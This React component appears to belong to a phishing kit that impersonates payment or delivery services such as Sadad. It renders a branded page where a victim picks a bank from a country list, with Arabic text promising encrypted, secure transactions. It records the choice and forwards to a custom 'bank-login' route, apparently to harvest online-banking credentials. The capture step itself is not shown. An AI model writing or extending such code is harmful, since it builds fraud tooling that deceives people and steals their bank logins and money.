import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Loader2 } from "lucide-react";
import { getBranding } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyLayout } from "@/components/CompanyLayouts";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = (linkData?.payload?.service_key || customerInfo.service || 'sadad').toLowerCase();
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(rawAmount, currencyCode);

  const Layout = getCompanyLayout(serviceKey);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
      }, 300);
    }
  }, [countryCode]);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    if (!linkData) return;

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData.payload, selectedBank: bankId }
      });
      setTimeout(() => navigate(`/pay/${id}/bank-login`), 300);
    } catch (error) {
      console.error("Error updating bank:", error);
    }
  };
  
  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <Loader2 className="w-8 h-8 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <Layout companyKey={serviceKey} amount={formattedAmount}>
      <div className="space-y-6">
        <div className="flex items-center justify-between mb-4">
          <h3 className="text-lg font-bold text-gray-800">اختر المصرف الخاص بك:</h3>
          <span className="text-xs text-gray-400">جميع المعاملات مشفرة وآمنة</span>
        </div>

        <div className="grid grid-cols-2 sm:grid-cols-3 gap-4">
          {loadingBanks ? (
            Array(6).fill(0).map((_, i) => (
              <div key={i} className="h-24 bg-gray-100 animate-pulse rounded border border-gray-200" />
            ))
          ) : (
            banks.map((bank) => (
              <button
                key={bank.id}
                onClick={() => handleBankSelect(bank.id)}
                className="group bg-white border border-[#D1D1D1] hover:border-[#EF7622] transition-all p-4 flex flex-col items-center justify-center gap-3 relative overflow-hidden"
                style={{ borderRadius: '0px' }}
              >
                <div className="h-12 w-full flex items-center justify-center">
                  <img 
                    src={bank.logo} 
                    alt={bank.nameAr} 
                    className="max-w-full max-h-full object-contain grayscale group-hover:grayscale-0 transition-all" 
                  />
                </div>
                <span className="text-[10px] font-bold text-gray-600 text-center leading-tight">
                  {bank.nameAr}
                </span>
                {selectedBank === bank.id && (
                  <div className="absolute top-0 right-0 bg-[#EF7622] text-white p-1">
                    <Loader2 className="w-3 h-3 animate-spin" />
                  </div>
                )}
              </button>
            ))
          )}
        </div>

        <div className="mt-8 p-4 bg-gray-50 border border-gray-200 text-[10px] text-gray-500 leading-relaxed">
          <p>تنبيه: سيتم توجيهك إلى صفحة تسجيل الدخول الآمنة الخاصة بالمصرف المختار. يرجى التأكد من عدم مشاركة بياناتك السرية مع أي جهة خارجية.</p>
        </div>
      </div>
    </Layout>
  );
};

export default PaymentBankSelector;
